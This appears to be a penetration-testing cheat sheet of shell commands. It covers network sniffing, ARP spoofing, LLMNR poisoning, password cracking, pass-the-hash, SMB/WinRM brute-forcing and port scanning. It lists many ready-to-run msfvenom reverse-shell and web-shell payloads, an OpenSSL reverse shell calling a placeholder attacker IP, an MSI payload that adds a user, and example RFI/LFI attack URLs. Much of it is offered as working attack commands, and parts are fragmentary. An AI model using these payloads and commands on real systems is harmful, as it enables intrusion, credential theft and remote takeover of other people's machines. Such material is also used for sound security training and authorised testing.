Starting p0f in background...

p0f $Source -f /etc/p0f/p0f.fp -o $Passive_Log_File >/dev/null 2>&1 &


"-=-=-=-=-=-=-=-=-=-=- Fingerprint Report -=-=-=-=-=-=-=-=-=-=-\n"





##  [+] Starting Ettercap in background...\c"

ettercap -TQ -i $Interface -u -l $EttercapLogClean  >/dev/null 2>&1 &



##  [+] Sniff_Etterlog

etterlog -x $Ettercap_Passive_Log > $Temp_Etterlog_XML 2>&1



##  [+] 

ettercap -Tq -i $IFACE -M arp:remote /$GATEWAY/ // &




##  [+] 

ettercap -TqM ARP:REMOTE // // & -----> command for LAN



##  [+] Forward packets from the router
echo "1" > /proc/sys/net/ipv4/ip_forward 


##  [+] Start driftnet to capture images on your computer
driftnet -i $IFACE &


##  [+] Start URLSnarf to show the websites the victim browses
urlsnarf -i $IFACE &


##  [+] Set up all redirection
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 8080


##  [+] Start ettercap
ettercap -TqM ARP:REMOTE // // &


Starting Attack on Target Host"
ettercap -TqM ARP:REMOTE /$GATEWAY3/ /$HOST3/ &




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Load Balancing Detection - lbd.sh + Halberd
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ---------------------------------------------------------------------------- ##
##   [?] Load Balancing Detection - 
## ---------------------------------------------------------------------------- ##


Are they using a Loadbalancer like F5 BigIP, or Citrix NetScaler




##-======================================-##
##   [+] Lbd - Load Balancing Detector
##-======================================-##
## ---------------------------------------------------------------------------- ##
##   [?] Detects whether a given domain uses DNS and/or HTTP load-balancing
## ---------------------------------------------------------------------------- ##
lbd.sh $URL



## ---------------------------------------------------------------------- ##
##   [?] Halberd - HTTP-based Load Balancer Detector.
##   [?]           checks for differences in the
##   [?]           HTTP response headers, cookies, timestamps, etc.
## ---------------------------------------------------------------------- ##
halberd $Domain










##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Virtual Hosting Detection - RitX + 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------ ##
##    [?] RitX - Virtual Hosting Detector
## ------------------------------------------ ##

perl RitX.pl -t $domain




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] WAF and IPS Detection - WAFW00F + 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ----------------------------------------------------------- ##
##   [?] WAFW00F - Web Application Firewall Detection Tool
## ----------------------------------------------------------- ##


## --------------------------------------------------------------------- ##
##   [?] WAFW00F - Identify and fingerprint Web Application Firewall
## --------------------------------------------------------------------- ##



wafw00f $Domain


wafw00f $Domain -a -v



--verbose

--list
              List all the WAFs that WAFW00F is able to detect.

--findall
              Find all WAFs, do not stop testing on the first one.

       -r, --noredirect
              Do not follow redirections given by 3xx responses.

       -t WAF, --test=WAF
              Test for one specific WAF product

--output=OUTPUT
              Write output to csv, json or text file

--input=INPUT
              Read targets from a file. Input format can be csv, json or text

--proxy=PROXY
              Use an HTTP proxy to perform requests, example: http://hostname:8080, socks5://hostname:1080

--headers=FILE
              Pass custom headers, for example to overwrite the default user-agent string.



Web Application Firewall Detection

nmap -p 80 --script http-waf-detect.nse oracle.com




WAFNinja
Arachni
Spaghetti

CMSscannerrecon 
WPscan
WPscanner
WPSeku
Droopescan
AutoADPwn
bloodhound
Empire

osstmm-afd


osstmm-afd -P HTTP -t www.$domain -v
osstmm-afd -P HTTP -t 127.0.0.1 -p 8888 -v

ices="asterisk,afp,cisco,cisco-enable,cvs,firebird,ftp,ftps,http-head,http-get,https-head,https-get,http-get-form,http-post-form,https-get-form,https-post-form,http-proxy,http-proxy-urlenum,icq,imap,imaps,irc,ldap2,ldap2s,ldap3,ldap3s,ldap3-crammd5,ldap3-crammd5s,ldap3-digestmd5,ldap3-digestmd5s,mssql,mysql,ncp,nntp,oracle-listener,oracle-sid,pcanywhere,pcnfs,pop3,pop3s,postgres,rdp,rexec,rlogin,rsh,s7-300,sip,smb,smtp,smtps,smtp-enum,snmp,socks5,ssh,sshkey,svn,teamspeak,telnet,telnets,vmauthd,vnc,xmpp


## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
##    [?] Detect ports the firewall is forwarding to a target
## --------------------------------------------------------------------- ##
firewalk -S1-1024 -i eth0 -n -pTCP 10.0.0.1 10.0.2.50


firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.1




##-=========================================-##
##   [+] listen for hash using metasploit
##-=========================================-##
use auxiliary/server/capture/smb
show options 
run


## -------------------------------------------------- ##
##    [?] Responder - LLMNR/NBT-NS/mDNS Poisoner
## -------------------------------------------------- ##
responder -I eth -w -F


##-===============================================================================-##
##   [+] Responder - NBT-NS + LLMNR Poisoning - via Capturing NTLMv2-SSP Hashes
##-===============================================================================-##
responder -I eth0 -rdwv


##-===============================================================================-##
##   [+] Responder - LLMNR Poisoning

responder -I eth0 -lm -v



DHCP and WPAD Poisoning:

responder -I eth0 -Pdwv




/usr/share/responder/logs/


ntlmrecon - Enumerate information from NTLM authentication enabled web endpoints

https://github.com/pwnfoo/NTLMRecon



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Password Cracking - John  the  Ripper + Hashcat
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



Hashcat:


##-=======================================-##
##   [+] Hashcat - 
##-=======================================-##


## ----------------------------------------- ##
##   [?] Hashcat - Find mode In hashcat  
## ----------------------------------------- ##
hashcat --example hashes  
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt




## ------------------------------------- ##
##    [?] John - Config Directories:
## ------------------------------------- ##
/etc/john/john.conf



john files --wordlist=/usr/share/wordlists/rockyou.txt




##-================================================================-##
##   [+] John - Continue an Interrupted Cracking Session
##-================================================================-##
## ---------------------------------------------------------------- ##
##   [?] John - reading point information from ~/.john/john.rec
## ---------------------------------------------------------------- ##
john -restore[:~/.john/john.rec



##-=================================-##
##   [+] Hashcat - PSSWD Mutation
##-=================================-##
hashcat -m 0 bfield.hash /usr/share/wordlists/rockyou.txt -r rules


##-=======================================-##
##   [+] Hashcat - Crack NTLM Passwords
##-=======================================-##
hashcat -m 5600 /$Dir/hashes.txt /$Dir/passwords.txt -o /$Dir/cracked.txt --force

 
##-===========================================-##
##   [+] FCrackZip - Cracking Zip Archives:
##-===========================================-##
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip 


##-=============================-##
##   [+] Cracking /etc/shadow
##-=============================-##
unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords



##-==========================-##
##   [+] Cracking KeePass:
##-==========================-##
keepass2john /$Dir/$NewDatabase.kdb > $File
john -incremental:alpha -format=keepass $File


##-==========================-##
##   [+] Bruteforce Salted
##-==========================-##

for j in $(cat cipher); do 
echo $j; 
for i in $(cat digestion); 
do /root/Documents/HTB/Hawk/bruteforce-salted-openssl/bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c $j -d $i ../miau.txt -1 2>&1 | grep "candidate" ; done ; done


openssl aes-256-cbc -d -in ../miau.txt -out $Result.txt -k friends



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Pass the Hash - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

Pass the Hash


Login to computer via hash password :

export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator% //10.11.01.76 cmd
 
 
pth-winexe -U hash //IP cmd

FreeRDP

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] CrackMapExec - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ----------------------------------------------------- ##
##   [?] CrackMapExec - 
## ----------------------------------------------------- ##


##-==================================================-##
##   [+] CrackMapExec - Enumerate Password Policy:
##-==================================================-##
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --pass-pol


##-=======================================-##
##   [+] Crackmapexec - Bruteforce SMB:
##-=======================================-##
crackmapexec smb 10.10.10.172 -u /root/users.lst -p /root/passwords.lst  


##-=========================================-##
##   [+] Crackmapexec - Bruteforce WinRM:
##-=========================================-##
crackmapexec winrm 10.10.10.172 -u /root/users.lst -p /root/passwords.lst





## --------------------------------------------------------- ##
##   [?] Bloodhound - Map An Active Directory Environment
## --------------------------------------------------------- ##
bloodhound-python -c All -d hackme.local -u $User -p $Pass -ns $IP



##-===============================================================-##
##   [+] bloodhound - LDAP Active Directory - Lateral Movement
##-===============================================================-##
## --------------------------------------------------------------- ##
##   [?] invoke-bloodhound from sharphound.ps1 
## --------------------------------------------------------------- ##
import-module .\sharphound.ps1
invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password







arachni http://$TARGET --report-save-path=$ARACHNI_REPORT_DIR/$TARGET --output-only-positives --scope-include-subdomains





## ------------------------------------------------- ##
##   [+] Xprobe2 OS fingerprinting
## ------------------------------------------------- ##
##   [?] fuzzy signature matching to provide
##       the probable operating system assessment
## ------------------------------------------------- ##
xprobe2 $IP

xprobe2 -v -p tcp:80:open $IP
xprobe2 -v -p tcp:80:open 192.168.6.66




## ---------------------------------------------------------------------- ##
##   [?] If TCP port 139 is open, enable application level SMB module
## ---------------------------------------------------------------------- ##
xprobe2 -p tcp:139:open 192.168.1.2


##-========================================-##
##   [+] Xprobe2 - Portscanning Module
##-========================================-##
xprobe2 -T 1-1024 127.0.0.1


## ----------------------------------------------------------------- ##
##   [?] TCP handshake module - Trys to blindly guess open ports
## ----------------------------------------------------------------- ##
xprobe2 -B 192.168.1.1



##-=========================================-##
##   [+] TCP handshake Module (Number 11) 
##-=========================================-##
## -------------------------------------------------------- ##
##   [?] very usefull when all ICMP traffic is filtered
## -------------------------------------------------------- ##
xprobe2 -M 11 -p tcp:80:open 192.168.1.1


## ------------------------------------------ ##
##   [?] Launch an OS Fingerprint Attempt
## ------------------------------------------ ##
xprobe2 -v -p udp:53:closed 192.168.1.20


## ---------------------------------------------------- ##
##   [?] Launch OS Fingerprinting Modules 1 & 2
##   [?] Module 1 & 2 Are Reachability Tests:
## ---------------------------------------------------- ##
xprobe2 -v -D 1 -D 2 192.168.1.10





## ---------------------------------------------------------------------- ##
##   [?] DMitry - Deepmagic Information Gathering Tool
## ---------------------------------------------------------------------- ##
dmitry -n $Domain       ## Retrieve  netcraft.com  data
dmitry -i $IP           ## Internet Number whois lookup
dmitry -w $Domain       ## Perform a whois lookup on the host target.
dmitry -p $Domain       ## Perform a TCP portscan on the host target
dmitry -s $Domain       ## Perform a subdomain search
dmitry -o $File $Domain ## Create  an ascii text output of the results



dmitry -iwnse $IP
dmitry -iwnse $Domain


dmitry -p 


##-===============================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===============================================================-##
##   [+] UnicornScan - Port Scanning + Enumeration - Pentesting
##-===============================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===============================================================-##


##-===================================================-##
##   [+] UnicornScan - TCP & UDP - (Full) Port Scan:
##-===================================================-##
## ---------------------------------------------------------------------- ##
unicornscan -mU -I $IP:a -v -l $File.txt
unicornscan -mT -I $IP:a -v -l $File.txt
## ---------------------------------------------------------------------- ##
unicornscan -mU -I $IP:a -v -l $UDPScan.txt
unicornscan -mT -I $IP:a -v -l $TCPScan.txt
## ---------------------------------------------------------------------- ##
unicornscan -mU -I $IP:a -v -l $UnicornScanUDPScanFull.txt
unicornscan -mT -I $IP:a -v -l $UnicornScanTCPScanFull.txt
## ---------------------------------------------------------------------- ##


##-===========================================-##
##   [+] UnicornScan - Port Scan - Full UDP
##-===========================================-##
unicornscan -mU -Ir 1000 $IP:a -v
unicornscan -mU -Ir 1000 192.168.0.0/24:a -v


##-====================================================-##
##   [+] UnicornScan - Network Wide Scan - Port 139
##-====================================================-##
unicornscan $IP/24:139
unicornscan 192.168.0.0/24:139



## ---------------------------------------------------------------------- ##
unicornscan -r500 -mT $IP/24:80,443,445,339
## ---------------------------------------------------------------------- ##
unicornscan -r500 -mT 198.71.232.1/24:80,443,445,339
## ---------------------------------------------------------------------- ##


##-=================================================-##
##   [+] UnicornScan - SYN Scan + OS Detect Scan:
##-=================================================-##
unicornscan -eosdetect -Iv -v $Domain
## ---------------------------------------------------------------------- ##
unicornscan -r200 -Iv -eosdetect -mT $IP:$Port,$Port,$Port
unicornscan -r200 -Iv -eosdetect -mT $Domain:$Port,$Port,$Port
## ---------------------------------------------------------------------- ##
unicornscan -r200 -Iv -eosdetect -mT $IP:3306,80,443
unicornscan -r200 -Iv -eosdetect -mT $Domain:3306,80,443
## ---------------------------------------------------------------------- ##
unicornscan -r200 -Iv -eosdetect -mT 198.71.232.3:3306,80,443
## ---------------------------------------------------------------------- ##



##-========================================-##
##   [+] UnicornScan - Verbose TCP Scan
##-========================================-##
## ---------------------------------------- ##
##   [?] -H Resolves Hostnames
## ---------------------------------------- ##
us -H -msf -Iv $IP -p 1-65535
us -H -msf -Iv 192.168.56.101 -p 1-65535


##-========================================-##
##   [+] UnicornScan - Verbose UDP Scan
##-========================================-##
us -H -mU -Iv $IP -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535


##-================================-##
##   [+] UnicornScan - Xmas scan
##-================================-##
unicornscan -mTsFPU $IP


##-================================-##
##   [+] UnicornScan - ACK scan
##-================================-##
unicornscan -mTsA $IP


##-================================-##
##   [+] UnicornScan - Fin scan
##-================================-##
unicornscan -mTsF $IP


##-=================================-##
##   [+] UnicornScan - Null scan
##-=================================-##
unicornscan -mTs+- $IP


##-===================================-##
##   [+] UnicornScan - Connect Scan
##-===================================-##
unicornscan -msf -Iv $Domain
unicornscan -msf -v -I $IP/24 
unicornscan -msf -v -I 198.71.232.3/24 


##-=============================================-##
##   [+] UnicornScan - scan with all options
##-=============================================-##
unicornscan -mTFSRPAUEC $IP
unicornscan -mTFSRPAUEC $IP/24 
unicornscan -mTFSRPAUEC 192.168.1.58




##-===================================================-##
##   [+] UDP-Protocol-Scanner - Port Scan - IP List
##-===================================================-##
udp-protocol-scanner.pl -f $IPs.txt

##-======================================================-##
##   [+] UDP-Protocol-Scanner - Protocol Specific Scan
##-======================================================-##
udp-protocol-scanner -p ntp -f $IPs.txt




NetworkMiner






ass - autonomous system scanner




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	        [+] Metasploit - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



# Metasploit Developer Documentation



sudo chown -R <username> /opt/metasploit-framework/
sudo chown -R <username> /Users/<username>/.msf4/
/opt/metasploit-framework/msfdb init
/opt/metasploit-framework/bin/msfconsole


Metasploit Framework API
https://rapid7.github.io/metasploit-framework/api


autopwn
autopwn-cli



##-===================================-##
##   [+] Metasploit - Socks Proxy:
##-===================================-##
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/server/socks4a

setg socks4:10.64.0.1:1080
setg socks4:10.8.0.1:1080



torsocks nmap -sT -T4 -Pn 10.10.10.50




##-###################################################-##
## --------------------------------------------------- ##
##-===================================================-##
##   [+] [+] Metasploit - MSFVenom - Web Payloads
##-===================================================-##
## --------------------------------------------------- ##
##-###################################################-##

##-=====================================================-##
##   [+] Metasploit - MSFVenom - PHP Web Payload
##-=====================================================-##
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`


##-=====================================================-##
##   [+] Metasploit - MSFVenom - ASP Web Payload
##-=====================================================-##
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`


##-=====================================================-##
##   [+] Metasploit - MSFVenom - JSP Web Payload
##-=====================================================-##
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`




##-=========================================-##
##    [+] MSFVenom - Generating Payloads:
##-=========================================-##


##-===============================================-##
##    [+] MSFVenom - PHP Reverse Shell Payload
##-===============================================-##
msfvenom -p php/reverse_php LHOST=$IP LPORT=443 > shell.php


##-===============================================-##
##    [+] MSFVenom - Windows Reverse Shellcode
##-===============================================-##
## --------------------------------------------------------------------- ##
##   [?] Windows reverse shellcode for python script buffer overflow
## --------------------------------------------------------------------- ##
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f c -e x86/alpha_mixed -b "\x00\x04\xcd\x77\x3f"


##-============================================-##
##    [+] MSFVenom - Windows Bind Shellcode
##-============================================-##
## ------------------------------------------------------------------ ##
##   [?] Windows bind shellcode for python script buffer overflow
## ------------------------------------------------------------------ ##
msfvenom -p windows/shell_bind_tcp LPORT=444 -f c -e x86/shikata_ga_nai -b  "\x00\x04\xcd\x77\x3f"


##-=====================================================-##
##    [+] MSFVenom - Meterpreter - .exe Reverse Shell
##-=====================================================-##
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=4444 -f exe > meterpreter.exe
	

##-=====================================================-##
##    [+] MSFVenom - Windows 64-bit Reverse TCP Shell 
##-=====================================================-##
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.120 LPORT=4444 -f exe > met64.exe


##-===============================================-##
##    [+] MSFVenom - WAR file for Apache Tomcat
##-===============================================-##
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=443 -f war > shell.war


##-==================================-##
##    [+] Jar - Extract shell.war
##-==================================-##
## ------------------------------------------------------------------------------------- ##
##   [?] find malicious js file extract shell.war then browse to js file in browser:
## ------------------------------------------------------------------------------------- ##
jar -xvf shell.war


##-=================================-##
##    [+] MSFVenom - Windows MSI
##-=================================-##
msfvenom -f msi-nouac -p windows/adduser USER=$User PASS=$Pass -o add_user.msi


##-=================================-##
##    [+] MSFVenom - Javascript:
##-=================================-##
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -f js_le


##-======================================-##
##    [+] MSFVenom - Linux ELF Binary:
##-======================================-##
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -b "\x00" -f elf -o $File





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SearchSploit + ExploitDB - Search Exploit DBs
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================================================-##
##   [+] SearchSploit - Search ExploitDB for Apache 2.4.7:
##-===========================================================-##
site:exploit-db.com apache 2.4.7


##-================================================================-##
##   [+] SearchSploit - Search for Apache - Remove DDoS-Exploits
##-================================================================-##
searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"


##-==================================================================-##
##    [+] SearchSploit - Only search the title (exclude the path):
##-==================================================================-##
searchsploit -t Apache | grep -v '/dos/'











##-===========================================-##
##    [+] OpenSSL - Encrypted Reverse Shell
##-===========================================-##


##-=========================================-##
##    [+] OpenSSL - Generate certificate:
##-=========================================-##
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes


##-=============================-##
##    [+] OpenSSL - Listener:
##-=============================-##
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>


##-==================================-##
##    [+] OpenSSL - Reverse Shell:
##-==================================-##
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s







##-===================================-##
##   [+] UnicornScan - Connect Scan
##-===================================-##
unicornscan -msf -Iv $IP



ACK scan                :    -mTsA
Fin scan                :    -mTsF
Null scan               :    -mTs
Xmas scan               :    -mTsFPU
Connect Scan            :    -msf -Iv


http://127.0.0.1/unicornscan




##-================================================-##
##   [+] UnicornScan - UDP Scan - Top 100 Ports:
##-================================================-##
unicornscan -H -I -v -mU -p 7,9,17,19,49,53,67,68,69,80,88,111,120,123,135,136,137,138,139,158,161,162,177,427,443,445,497,500,514,515,518,520,593,623,626,631,996,997,998,999,1022,1023,1025,1026,1027,1028,1029,1030,1433,1434,1645,1646,1701,1718,1719,1812,1813,1900,2000,2048,2049,2222,2223,3283,3456,3703,4444,4500,5000,5060,5353,5632,9200,10000,17185,20031,30718,31337,32768,32769,32771,32815,33281,49152,49153,49154,49156,49181,49182,49185,49186,49188,49190,49191,49192,49193,49194,49200,49201,65024 $IP
unicornscan -H -I -v -mU -p 7,9,17,19,49,53,67,68,69,80,88,111,120,123,135,136,137,138,139,158,161,162,177,427,443,445,497,500,514,515,518,520,593,623,626,631,996,997,998,999,1022,1023,1025,1026,1027,1028,1029,1030,1433,1434,1645,1646,1701,1718,1719,1812,1813,1900,2000,2048,2049,2222,2223,3283,3456,3703,4444,4500,5000,5060,5353,5632,9200,10000,17185,20031,30718,31337,32768,32769,32771,32815,33281,49152,49153,49154,49156,49181,49182,49185,49186,49188,49190,49191,49192,49193,49194,49200,49201,65024 $IP 2>&1 | tee $File.txt

unicornscan -H -I -v -mU -p 7,9,17,19,49,53,67,68,69,80,88,111,120,123,135,136,137,138,139,158,161,162,177,427,443,445,497,500,514,515,518,520,593,623,626,631,996,997,998,999,1022,1023,1025,1026,1027,1028,1029,1030,1433,1434,1645,1646,1701,1718,1719,1812,1813,1900,2000,2048,2049,2222,2223,3283,3456,3703,4444,4500,5000,5060,5353,5632,9200,10000,17185,20031,30718,31337,32768,32769,32771,32815,33281,49152,49153,49154,49156,49181,49182,49185,49186,49188,49190,49191,49192,49193,49194,49200,49201,65024 $1 2>&1 | tee $File.txt
unicornscan -H -I -v -mU -p 7,9,17,19,49,53,67,68,69,80,88,111,120,123,135,136,137,138,139,158,161,162,177,427,443,445,497,500,514,515,518,520,593,623,626,631,996,997,998,999,1022,1023,1025,1026,1027,1028,1029,1030,1433,1434,1645,1646,1701,1718,1719,1812,1813,1900,2000,2048,2049,2222,2223,3283,3456,3703,4444,4500,5000,5060,5353,5632,9200,10000,17185,20031,30718,31337,32768,32769,32771,32815,33281,49152,49153,49154,49156,49181,49182,49185,49186,49188,49190,49191,49192,49193,49194,49200,49201,65024 $1 2>&1 | tee "udp_ports_top100_$1_unicornscan.txt"




##-==========================================================-##
##   [+] Uniscan - LFI, RFI, and RCE vulnerability scanner
##-==========================================================-##






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	        [+] FinalRecon - Web Reconnaissance
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ---------------------------------------------------------------------------------- ##
    finalrecon -d $DNS        ## Custom DNS Servers [ Default : 1.1.1.1 ]
## ---------------------------------------------------------------------------------- ##
    finalrecon -e txt         ## TXT File Extension
    finalrecon -e xml         ## XML File Extension
## ---------------------------------------------------------------------------------- ##
    finalrecon -o txt         ## Export Output Format: .txt
    finalrecon -o xml         ## Export Output Format: .xml
    finalrecon -o csv         ## Export Output Format: .csv
## ---------------------------------------------------------------------------------- ##
    finalrecon -w $File       ## Path to Wordlist [Default: wordlists/dirb_common.txt
## ---------------------------------------------------------------------------------- ##

## ---------------------------------------------------------------------------------- ##
    finalrecon --headers $Domain        ## Header Information
    finalrecon --sslinfo $Domain        ## SSL Certificate Information
    finalrecon --whois $Domain          ## Whois Lookup
    finalrecon --crawl $Domain          ## Crawl Target
    finalrecon --dns $Domain            ## DNS Enumeration
    finalrecon --sub $Domain            ## Sub-Domain Enumeration
    finalrecon --trace $Domain          ## Traceroute
    finalrecon --dir $Domain            ## Directory Search
    finalrecon --ps $Domain             ## Fast Port Scan
    finalrecon --full $Domain           ## Full Recon
## ---------------------------------------------------------------------------------- ##







pnscan


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	        [+] OpenVAS - Vulnerability Scanner
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

openvas-scanner



##-===============================-##
##   [+] Fetch OpenVAS GPG Key:
##-===============================-##
curl --progress -k -L "http://www.openvas.org/OpenVAS_TI.asc" | gpg --import -


##-==================================-##
##   [+] Sync the OpenVAS NVT feed:
##-==================================-##
sudo openvas-nvt-sync


## --------------------------------------------------------- ##
##   [?] Sync Security Content Automation Protocol (SCAP):
## --------------------------------------------------------- ##
sudo openvas-scapdata-sync

## ------------------------------------------------------ ##
##   [?] Sync Computer Emergency Readiness Team (CERT):
## ------------------------------------------------------ ##
sudo openvas-certdata-sync


##-=================================================-##
##   [+] Restart the OpenVAS scanner and manager:
##-=================================================-##
sudo service openvas-scanner restart
sudo service openvas-manager restart


##-=====================================-##
##   [+] Rebuild the OpenVAS database:
##-=====================================-##
sudo openvasmd --rebuild --progress


##-============================================-##
##   [+] Greenbone Security Assistant WebUI:
##-============================================-##

sudo openvasmd --user=$User --new-password=$Pass
openvasmd --create-user="$User"; openvasmd --user="$User" --new-password="$Pass"


xdg-open https://127.0.0.1:9392/


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	        [+] Nessus - Vulnerability Scanner
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-============================-##
##   [+] Get download link
##-============================-##
xdg-open http://www.tenable.com/products/nessus/select-your-operating-system


##-===============================-##
##   [+] Install Nessus Binary:
##-===============================-##
dpkg -i /usr/local/src/Nessus-*.deb


service nessusd start


xdg-open http://www.tenable.com/products/nessus-home


##-=========================-##
##   [+] Add Nessus User:
##-=========================-##
/opt/nessus/sbin/nessus-adduser


##-=========================-##
##   [+] Register Nessus:
##-=========================-##
/opt/nessus/sbin/nessuscli fetch --register $key
/opt/nessus/sbin/nessusd -R
/opt/nessus/sbin/nessus-service -D

##-=======================-##
##   [+] Nessus WebUI:
##-=======================-##
xdg-open https://127.0.0.1:8834/






## Nessus WebUI                        https://127.0.0.1:8834/">Nessus</A>\n</DL><p>
## OpenVAS WebUI                       https://127.0.0.1:9392/">OpenVAS</A>\n</DL><p>
## Nexpose WebUI                       https://127.0.0.1:3780/">Nexpose</A>\n</DL><p>
## Metasploit WebUI                    https://127.0.0.1:3790/">MSF</A>\n</DL><p>
## BeEF WebUI                          http://127.0.0.1:3000/ui/panel">BeEF</A>\n<DL><p>
## Unicorn WebUI                       http://127.0.0.1/unicornscan









Magic Unicorn Attack Vector - Native x86 powershell injection attacks on any Windows platform



onesixtyone


masscan







 •
 •
 •
 •
 •
 •
BurpSuite
Arachni
Metasploit WMAP
Nikto
OWASP Zap
w3af


##-====================================-##
##   [•] Remote File Inclusion (RFI)
##-====================================-##
## ------------------------------------------------------------------------- ##
##   [?] Attacker references a file on another server
## ------------------------------------------------------------------------- ##
##   [?] http://original.com/page.php?font=http://badbuy.com/bad_file.php
## ------------------------------------------------------------------------- ##


##-===================================-##
##   [•] Local File Inclusion (LFI)
##-===================================-##
## ---------------------------------------------------------------------- ##
##   [?] Attacker can exploit this to access files local to the server.
## ---------------------------------------------------------------------- ##
##   [?] http://oringal.com/page.php?font=../../Windows/system32/cmd.exe%00
## ---------------------------------------------------------------------- ##





nikto -C all -h http://$TARGET

nikto -h $IP -p 1234 $IP
